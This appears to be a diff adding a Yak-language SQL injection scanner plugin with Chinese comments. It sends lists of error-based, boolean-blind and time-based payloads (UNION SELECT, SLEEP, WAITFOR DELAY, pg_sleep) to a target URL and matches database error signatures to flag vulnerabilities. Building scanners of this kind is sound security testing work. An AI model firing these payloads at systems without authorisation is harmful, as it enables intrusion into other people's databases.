@@ -1,0 +1,378 @@
+# SQL 注入检测插件
+# @Author: Yak
+# @Description: 基于错误回显、布尔盲注和时间盲注的 SQL 注入检测
+
+__PLUGIN_NAME__ = "SQL注入检测"
+__PLUGIN_AUTHOR__ = "Yak"
+__PLUGIN_DESCRIPTION__ = "检测 GET/POST 参数中的 SQL 注入漏洞，支持错误回显、布尔盲注和时间盲注检测"
+__PLUGIN_VERSION__ = "1.0.0"
+
+# 参数定义
+cli.String("target", cli.setRequired(true), cli.setHelp("目标 URL，例如: http://example.com/page.php?id=1"))
+cli.String("method", cli.setDefault("GET"), cli.setHelp("请求方法: GET/POST"))
+cli.String("data", cli.setDefault(""), cli.setHelp("POST 数据，例如: username=admin&password=123"))
+cli.String("cookie", cli.setDefault(""), cli.setHelp("Cookie 字符串"))
+cli.Int("timeout", cli.setDefault(10), cli.setHelp("请求超时时间(秒)"))
+cli.Bool("verbose", cli.setDefault(false), cli.setHelp("显示详细输出"))
+
+# SQL 注入 Payloads
+errorPayloads = [
+    "'",
+    "''",
+    "' AND 1=1 --",
+    "' AND 1=2 --",
+    "' OR '1'='1",
+    "\"",
+    "\" AND 1=1 --",
+    "\" AND 1=2 --",
+    "1' AND 1=1 --",
+    "1' AND 1=2 --",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+]
+
+timePayloads = [
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+    "' AND SLEEP(5) --",
+    "\" AND SLEEP(5) --",
+    "1' AND SLEEP(5) --",
+    "1 AND SLEEP(5)",
+    "'; WAITFOR DELAY '0:0:5' --",
+    "'; SELECT pg_sleep(5) --",
+    "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))A) --",
+]
+
+# 数据库错误特征
+errorSignatures = {
+    "MySQL": [
+        "SQL syntax.*MySQL",
+        "Warning.*mysql_.*",
+        "MySqlException",
+        "valid MySQL result",
+        "MySQL.*Driver",
+        "MySQL.*server",
+    ],
+    "PostgreSQL": [
+        "PostgreSQL.*ERROR",
+        "Warning.*pg_.*",
+        "PgSqlException",
+        "valid PostgreSQL result",
+        "PG::Error",
+    ],
+    "MSSQL": [
+        "Microsoft SQL Server.*ERROR",
+        "ODBC SQL Server Driver",
+        "SqlException",
+        "SQLServer JDBC Driver",
+        "com.microsoft.sqlserver",
+    ],
+    "Oracle": [
+        "Oracle.*ERROR",
+        "Oracle.*Driver",
+        "ORA-[0-9]{5}",
+        "OracleException",
+    ],
+    "SQLite": [
+        "SQLite.*ERROR",
+        "sqlite3.OperationalError",
+        "SQLite exception",
+        "System.Data.SQLite",
+    ],
+}
+
+# 检测错误回显
+func detectErrorInjection(target, method, data, cookie, timeout, verbose) {
+    if verbose {
+        println("[*] 开始错误回显检测...")
+    }
+
+    for _, payload := range errorPayloads {
+        modifiedTarget = target
+        modifiedData = data
+
+        if method == "GET" {
+            if str.Contains(target, "?") {
+                modifiedTarget = target + payload
+            } else {
+                modifiedTarget = target + "?" + payload
+            }
+        } else {
+            if data != "" {
+                modifiedData = data + payload
+            } else {
+                modifiedData = payload
+            }
+        }
+
+        req = http.Request(
+            modifiedTarget,
+            http.method(method),
+            http.body(modifiedData),
+            http.cookie(cookie),
+            http.timeout(timeout),
+        )
+
+        rsp, err = http.Do(req)
+        if err != nil {
+            continue
+        }
+
+        body = http.GetBody(rsp)
+        if body == "" {
+            continue
+        }
+
+        for dbType, signatures := range errorSignatures {
+            for _, signature := range signatures {
+                if re.Match(signature, body) {
+                    return {
+                        "vulnerable": true,
+                        "type": "Error-based SQL Injection",
+                        "database": dbType,
+                        "payload": payload,
+                        "signature": signature,
+                    }
+                }
+            }
+        }
+    }
+
+    return {"vulnerable": false}
+}
+
+# 检测布尔盲注
+func detectBooleanBlind(target, method, data, cookie, timeout, verbose) {
+    if verbose {
+        println("[*] 开始布尔盲注检测...")
+    }
+
+    # 获取正常响应
+    normalReq = http.Request(
+        target,
+        http.method(method),
+        http.body(data),
+        http.cookie(cookie),
+        http.timeout(timeout),
+    )
+    normalRsp, _ = http.Do(normalReq)
+    normalBody = http.GetBody(normalRsp)
+    normalLength = len(normalBody)
+
+    # 测试 True 条件
+    truePayloads = [
+        "' AND '1'='1' --",
+        "\" AND \"1\"=\"1\" --",
+        " AND 1=1",
+        "' OR '1'='1' --",
+    ]
+
+    # 测试 False 条件
+    falsePayloads = [
+        "' AND '1'='2' --",
+        "\" AND \"1\"=\"2\" --",
+        " AND 1=2",
+        "' AND 1=2 --",
+    ]
+
+    for i := 0; i < len(truePayloads); i++ {
+        truePayload = truePayloads[i]
+        falsePayload = falsePayloads[i]
+
+        # True 请求
+        trueTarget = target
+        falseTarget = target
+        trueData = data
+        falseData = data
+
+        if method == "GET" {
+            trueTarget = target + truePayload
+            falseTarget = target + falsePayload
+        } else {
+            trueData = data + truePayload
+            falseData = data + falsePayload
+        }
+
+        trueReq = http.Request(
+            trueTarget,
+            http.method(method),
+            http.body(trueData),
+            http.cookie(cookie),
+            http.timeout(timeout),
+        )
+        trueRsp, _ = http.Do(trueReq)
+        trueBody = http.GetBody(trueRsp)
+        trueLength = len(trueBody)
+
+        # False 请求
+        falseReq = http.Request(
+            falseTarget,
+            http.method(method),
+            http.body(falseData),
+            http.cookie(cookie),
+            http.timeout(timeout),
+        )
+        falseRsp, _ = http.Do(falseReq)
+        falseBody = http.GetBody(falseRsp)
+        falseLength = len(falseBody)
+
+        # 比较差异
+        if abs(trueLength - falseLength) > 50 && abs(trueLength - normalLength) < 50 {
+            return {
+                "vulnerable": true,
+                "type": "Boolean-based Blind SQL Injection",
+                "truePayload": truePayload,
+                "falsePayload": falsePayload,
+                "trueLength": trueLength,
+                "falseLength": falseLength,
+            }
+        }
+    }
+
+    return {"vulnerable": false}
+}
+
+# 检测时间盲注
+func detectTimeBlind(target, method, data, cookie, timeout, verbose) {
+    if verbose {
+        println("[*] 开始时间盲注检测...")
+    }
+
+    # 正常请求时间
+    normalReq = http.Request(
+        target,
+        http.method(method),
+        http.body(data),
+        http.cookie(cookie),
+        http.timeout(timeout),
+    )
+    normalStart = time.Now()
+    http.Do(normalReq)
+    normalDuration = time.Since(normalStart)
+
+    for _, payload := range timePayloads {
+        modifiedTarget = target
+        modifiedData = data
+
+        if method == "GET" {
+            modifiedTarget = target + payload
+        } else {
+            modifiedData = data + payload
+        }
+
+        req = http.Request(
+            modifiedTarget,
+            http.method(method),
+            http.body(modifiedData),
+            http.cookie(cookie),
+            http.timeout(timeout + 5),
+        )
+
+        start = time.Now()
+        _, err = http.Do(req)
+        duration = time.Since(start)
+
+        if err == nil && duration > 5 * time.Second && duration > normalDuration + 4 * time.Second {
+            return {
+                "vulnerable": true,
+                "type": "Time-based Blind SQL Injection",
+                "payload": payload,
+                "delay": duration.String(),
+            }
+        }
+    }
+
+    return {"vulnerable": false}
+}
+
+# 主函数
+func main() {
+    target = cli.String("target")
+    method = cli.String("method")
+    data = cli.String("data")
+    cookie = cli.String("cookie")
+    timeout = cli.Int("timeout")
+    verbose = cli.Bool("verbose")
+
+    if target == "" {
+        println("SQL 注入检测插件")
+        println("用法: yak sql_injection_scan.yak --target <URL> [选项]")
+        println("")
+        println("选项:")
+        println("  --target    目标 URL (必需)")
+        println("  --method    请求方法: GET/POST (默认: GET)")
+        println("  --data      POST 数据")
+        println("  --cookie    Cookie 字符串")
+        println("  --timeout   请求超时时间(秒) (默认: 10)")
+        println("  --verbose   显示详细输出")
+        println("")
+        println("示例:")
+        println("  yak sql_injection_scan.yak --target http://example.com/page.php?id=1")
+        println("  yak sql_injection_scan.yak --target http://example.com/login --method POST --data 'username=admin&password=123'")
+        return
+    }
+
+    println("=" * 60)
+    println("SQL 注入检测插件")
+    println("目标:", target)
+    println("方法:", method)
+    println("=" * 60)
+
+    # 错误回显检测
+    errorResult = detectErrorInjection(target, method, data, cookie, timeout, verbose)
+    if errorResult.vulnerable {
+        println("[+] 发现 SQL 注入漏洞!")
+        println("    类型:", errorResult.type)
+        println("    数据库:", errorResult.database)
+        println("    Payload:", errorResult.payload)
+        println("    匹配特征:", errorResult.signature)
+        risk.NewRisk(
+            target,
+            risk.type("sql-injection"),
+            risk.level("high"),
+            risk.title("SQL 注入漏洞"),
+            risk.details(errorResult),
+        )
+        return
+    }
+
+    # 布尔盲注检测
+    boolResult = detectBooleanBlind(target, method, data, cookie, timeout, verbose)
+    if boolResult.vulnerable {
+        println("[+] 发现 SQL 注入漏洞!")
+        println("    类型:", boolResult.type)
+        println("    True Payload:", boolResult.truePayload)
+        println("    False Payload:", boolResult.falsePayload)
+        risk.NewRisk(
+            target,
+            risk.type("sql-injection"),
+            risk.level("high"),
+            risk.title("SQL 注入漏洞(布尔盲注)"),
+            risk.details(boolResult),
+        )
+        return
+    }
+
+    # 时间盲注检测
+    timeResult = detectTimeBlind(target, method, data, cookie, timeout, verbose)
+    if timeResult.vulnerable {
+        println("[+] 发现 SQL 注入漏洞!")
+        println("    类型:", timeResult.type)
+        println("    Payload:", timeResult.payload)
+        println("    延迟:", timeResult.delay)
+        risk.NewRisk(
+            target,
+            risk.type("sql-injection"),
+            risk.level("high"),
+            risk.title("SQL 注入漏洞(时间盲注)"),
+            risk.details(timeResult),
+        )
+        return
+    }
+
+    println("[-] 未发现 SQL 注入漏洞")
+}
+
+main()
